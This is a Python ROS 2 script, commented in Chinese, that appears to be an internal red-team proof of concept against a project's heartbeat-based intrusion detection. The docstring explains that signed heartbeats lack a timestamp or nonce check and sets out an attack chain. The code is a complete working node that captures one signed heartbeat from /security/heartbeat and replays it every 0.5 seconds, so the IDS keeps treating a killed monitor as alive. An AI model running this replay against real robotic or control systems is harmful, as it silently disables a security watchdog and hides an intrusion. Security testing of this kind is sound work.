#!/usr/bin/env python3
"""攻擊 N1 — /security/heartbeat replay attack.

威脅模型沒提到這個攻擊。漏洞分析：

    monitor_node._publish_heartbeat 每 2 秒簽章 publish:
        payload = f'hb|{time.time():.3f}'
        msg.data = sign_alert(payload, secret)    # HMAC over payload
        heartbeat_pub.publish(msg)

    intelligent_defense_node._hb_cb 收到後:
        payload = verify_alert(msg.data, secret)  # ← 只驗 HMAC
        if payload is None: return
        self._last_heartbeat_wall = time.monotonic()  # ← 不驗 payload 內 timestamp！

漏洞：HMAC 簽章保證「來自有 secret 的人」，但「沒有 nonce / freshness 檢查」
→ 攻擊者錄一筆合法心跳，無限重放 → IDS 永遠認為 monitor 在線

攻擊鏈：
    1. (L1 能力) 監聽 /security/heartbeat 1 次，存下一筆 signed bytes
    2. kill monitor_node（或假設 monitor 被打掛 / DoS）
    3. 攻擊者用「同樣的 signed bytes」每 0.5s 重 publish
    4. IDS D5 (heartbeat watchdog) 永遠不 fire → 攻擊者已殺掉防線之一

影響：威脅模型 G6 修補「kill monitor 會被抓」失效。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy
from std_msgs.msg import String


class HeartbeatRecorderReplayer(Node):
    """先錄一筆心跳 → 切換成 replay 模式無限重送"""

    def __init__(self):
        super().__init__('attacker_hb_replay')
        qos = QoSProfile(depth=1, reliability=ReliabilityPolicy.BEST_EFFORT)
        self._captured: str | None = None
        self._capture_sub = self.create_subscription(
            String, '/security/heartbeat', self._on_capture, qos)
        # 同樣 QoS 偽裝成 monitor
        self._replay_pub = self.create_publisher(
            String, '/security/heartbeat', qos)
        self._replay_timer = None
        self._n = 0
        self.get_logger().warn('🎯 開始監聽 /security/heartbeat ...')

    def _on_capture(self, msg: String):
        if self._captured is not None:
            return
        self._captured = msg.data
        self.get_logger().error(
            f'📼 已捕獲簽章心跳 (len={len(msg.data)}): {msg.data[:80]}...'
        )
        # 銷毀 subscription，避免重複收到自己 replay 的訊息
        self.destroy_subscription(self._capture_sub)
        # 立刻切 replay 模式：每 0.5s 重發同一筆，遠快於 HEARTBEAT_TIMEOUT_SEC=10
        self._replay_timer = self.create_timer(0.5, self._replay)
        self.get_logger().error('🔁 切換為 REPLAY 模式：每 0.5s 重送同一筆心跳')

    def _replay(self):
        if self._captured is None:
            return
        m = String()
        m.data = self._captured
        self._replay_pub.publish(m)
        self._n += 1
        if self._n % 10 == 0:
            self.get_logger().warn(
                f'  已重放 {self._n} 次（IDS 視 monitor 為「活著」）'
            )


def main():
    rclpy.init()
    node = HeartbeatRecorderReplayer()
    deadline = time.monotonic() + (
        float(sys.argv[1]) if len(sys.argv) > 1 else 30.0
    )
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error(
            f'⏹ 結束，總共重放 {node._n} 次'
        )
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
